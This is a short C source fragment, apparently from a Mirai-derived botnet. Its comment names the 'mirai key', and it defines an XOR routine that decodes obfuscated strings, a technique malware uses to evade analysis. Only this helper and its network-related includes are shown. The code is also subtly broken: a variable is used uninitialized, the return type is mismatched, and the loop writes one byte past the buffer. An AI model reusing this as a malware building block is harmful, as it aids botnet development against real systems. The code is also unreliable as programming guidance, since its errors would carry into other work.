#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/tcp.h>
#include <sys/socket.h>

static char *xor_key = "qE6MGAbI"; // the bigger it is the more rounds (more cpu to decode)
static int key_len = 8; // length of xor_key
static unsigned int fake_key = 0xDEADBEEF; // mirai key

int *xor_decode(char *string, int len)
{
    int i = 0;
    unsigned int tmp_key;

    for (i = 0; i < key_len; i++)
    {
        int q = 0;

        if (key_len % 2 == 0)
            tmp_key = tmp_key + fake_key;

        tmp_key = tmp_key >> 16;
        tmp_key = tmp_key & 0x0000FFFF;

        for (q = len; q != -1; q--)
            string[q] = string[q] ^ (xor_key[i] + q);
    }
    
    return string;

}

